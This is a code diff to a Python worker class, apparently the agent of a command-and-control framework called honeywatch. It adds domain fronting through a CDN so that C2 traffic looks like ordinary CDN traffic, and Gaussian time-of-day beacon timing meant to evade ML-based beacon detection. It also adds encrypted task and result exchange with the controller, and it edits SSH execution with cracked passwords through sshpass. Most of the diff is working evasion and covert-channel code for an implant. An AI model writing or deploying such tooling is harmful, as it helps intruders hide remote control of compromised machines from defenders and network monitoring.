@@ -69,6 +69,8 @@ class Worker:
         c2_encrypt: bool = False,
         c2_key: str | None = None,
         adaptive_timing: bool = False,
+        domain_front: str | None = None,
+        human_timing: bool = False,
     ):
         self.controller_url = controller_url.rstrip("/")
         self.worker_id = worker_id or f"worker-{uuid.uuid4().hex[:8]}"
@@ -80,6 +82,16 @@ class Worker:
         # request (Authorization header) and every WebSocket handshake (?token=).
         self.api_token = api_token
         self._shutdown = False
+        # Domain fronting: when set, connections go to the CDN front domain
+        # (what the firewall sees) while the Host header points to the real
+        # controller (what the CDN routes to). SNI is set to the CDN front
+        # domain; the inner Host header is the real controller.
+        self.domain_front = domain_front
+        # Human-like timing: when enabled, the idle beacon interval follows
+        # a time-of-day Gaussian distribution (short during business hours,
+        # long at night) to evade ML-based beacon detection. The adaptive
+        # timing RTT adjustments still apply on top of this base.
+        self.human_timing = human_timing
         # Adaptive jittered beacon. A fixed-interval poll is a network
         # signature (a metronomic beacon to one host); jitter spreads each
         # wait around `poll_interval` and the level backs off exponentially up
@@ -183,6 +195,21 @@ class Worker:
             headers["Content-Type"] = "application/json"
         if self.api_token:
             headers["Authorization"] = f"Bearer {self.api_token}"
+        # Domain fronting: connect to the CDN front domain (SNI) while
+        # setting the Host header to the real controller so the CDN routes
+        # the request to the correct backend. This makes C2 traffic look
+        # like normal CDN traffic to network monitors.
+        if self.domain_front:
+            # Extract the real controller host for the Host header.
+            from urllib.parse import urlparse
+            real_host = urlparse(self.controller_url).netloc
+            headers["Host"] = real_host
+            # Rewrite URL to connect to the CDN front domain instead.
+            # The path stays the same — the CDN routes based on Host.
+            front_url = self.controller_url.replace(
+                real_host, self.domain_front, 1
+            )
+            url = f"{front_url}{path}"
         body = json.dumps(data).encode("utf-8") if data else None
         req = urllib.request.Request(
             url,
@@ -332,8 +359,14 @@ class Worker:
                 return {"mode": "ssh", "target": f"{user}@{target.ip}", "error": str(exc)}
         # Password auth (cracked credential): delegate to sshpass via an env
         # var (-e) so the secret never appears in argv / process listings.
-        env = dict(os.environ)
-        env["SSHPASS"] = passw
+        # Minimal env — never leak the operator's full os.environ (API keys,
+        # tokens, vault passphrases) into the subprocess.
+        env = {
+            "HOME": os.environ.get("HOME", "/root"),
+            "PATH": os.environ.get("PATH", "/usr/local/bin:/usr/bin:/bin"),
+            "SSHPASS": passw,
+            "LANG": os.environ.get("LANG", "C.UTF-8"),
+        }
         argv = ["sshpass", "-e",
                 "ssh", "-o", "StrictHostKeyChecking=no",
                 "-o", "PreferredAuthentications=password",
@@ -391,9 +424,18 @@ class Worker:
                 if task is None:
                     # Idle: sleep a jittered wait at the current backoff level,
                     # then grow the level toward max_backoff (jittered so the
-                    # cadence is not a clean metronome).
+                    # cadence is not a clean metronome). When human_timing is
+                    # enabled, blend in time-of-day Gaussian intervals so the
+                    # beacon pattern evades ML detection.
                     if self.adaptive_timing:
-                        await asyncio.sleep(self._adaptive_interval())
+                        interval = self._adaptive_interval()
+                        if self.human_timing:
+                            from honeywatch.c2.beacon import human_like_interval
+                            interval = max(interval, human_like_interval(self.poll_interval))
+                        await asyncio.sleep(interval)
+                    elif self.human_timing:
+                        from honeywatch.c2.beacon import human_like_interval
+                        await asyncio.sleep(human_like_interval(self.poll_interval))
                     else:
                         await asyncio.sleep(self.beacon.on_idle())
                     continue
@@ -433,6 +475,19 @@ class Worker:
         uri = self.controller_url
         if uri.startswith("http"):
             uri = uri.replace("http", "ws", 1)
+        # Domain fronting for WebSocket: connect to the CDN front domain
+        # and set the Host header to the real controller.
+        ws_headers: dict[str, str] = {}
+        if self.domain_front:
+            from urllib.parse import urlparse
+            real_host = urlparse(self.controller_url).netloc
+            ws_headers["Host"] = real_host
+            front_uri = self.controller_url.replace(
+                real_host, self.domain_front, 1
+            )
+            if front_uri.startswith("http"):
+                front_uri = front_uri.replace("http", "ws", 1)
+            uri = front_uri
         if self.api_token:
             sep = "&" if "?" in uri else "?"
             uri = f"{uri}{sep}token={self.api_token}"
@@ -448,6 +503,8 @@ class Worker:
         ws_kwargs: dict[str, Any] = {}
         if self.ssl_context is not None and uri.lower().startswith("wss://"):
             ws_kwargs["ssl"] = self.ssl_context
+        if ws_headers:
+            ws_kwargs["additional_headers"] = ws_headers
         while not self._shutdown:
             try:
                 async with websockets.connect(uri, **ws_kwargs) as ws:
@@ -478,6 +535,62 @@ class Worker:
                                         result.get("returncode", 0) == 0
                                         and "error" not in result
                                     )
+                                    if self.c2_encrypt and self.crypto:
+                                        from honeywatch.c2.crypto import encrypt_result
+                                        encrypted = encrypt_result(
+                                            {"success": success, "result": result},
+                                            self.crypto,
+                                        )
+                                        encrypted["type"] = "task_result"
+                                        encrypted["task_id"] = task.id
+                                        encrypted["api_version"] = 2
+                                        await ws.send(json.dumps(encrypted))
+                                    else:
+                                        await ws.send(
+                                            json.dumps(
+                                                {
+                                                    "type": "task_result",
+                                                    "task_id": task.id,
+                                                    "success": success,
+                                                    "result": result,
+                                                }
+                                            )
+                                        )
+                            except Exception as exc:
+                                print(f"honeywatch worker: {exc}", flush=True)
+                            continue
+                        except ConnectionClosed:
+                            # Socket is gone -> break inner loop so the outer
+                            # loop reconnects instead of polling a dead socket.
+                            break
+                        payload = json.loads(msg)
+                        if payload.get("type") == "task":
+                            task_data = payload["task"]
+                            # Decrypt task payload when C2 encryption is
+                            # enabled and the controller sent api_version=2.
+                            if (self.c2_encrypt and self.crypto
+                                    and payload.get("api_version") == 2
+                                    and "encrypted_task" in payload):
+                                from honeywatch.c2.crypto import decrypt_task
+                                task_data = decrypt_task(payload, self.crypto)
+                            task = _task_from_dict(task_data)
+                            result = await asyncio.to_thread(self.execute_task, task)
+                            success = (
+                                result.get("returncode", 0) == 0
+                                and "error" not in result
+                            )
+                            try:
+                                if self.c2_encrypt and self.crypto:
+                                    from honeywatch.c2.crypto import encrypt_result
+                                    encrypted = encrypt_result(
+                                        {"success": success, "result": result},
+                                        self.crypto,
+                                    )
+                                    encrypted["type"] = "task_result"
+                                    encrypted["task_id"] = task.id
+                                    encrypted["api_version"] = 2
+                                    await ws.send(json.dumps(encrypted))
+                                else:
                                     await ws.send(
                                         json.dumps(
                                             {
@@ -488,32 +601,6 @@ class Worker:
                                             }
                                         )
                                     )
-                            except Exception as exc:
-                                print(f"honeywatch worker: {exc}", flush=True)
-                            continue
-                        except ConnectionClosed:
-                            # Socket is gone -> break inner loop so the outer
-                            # loop reconnects instead of polling a dead socket.
-                            break
-                        payload = json.loads(msg)
-                        if payload.get("type") == "task":
-                            task = _task_from_dict(payload["task"])
-                            result = await asyncio.to_thread(self.execute_task, task)
-                            success = (
-                                result.get("returncode", 0) == 0
-                                and "error" not in result
-                            )
-                            try:
-                                await ws.send(
-                                    json.dumps(
-                                        {
-                                            "type": "task_result",
-                                            "task_id": task.id,
-                                            "success": success,
-                                            "result": result,
-                                        }
-                                    )
-                                )
                             except ConnectionClosed:
                                 break
             except Exception as exc:
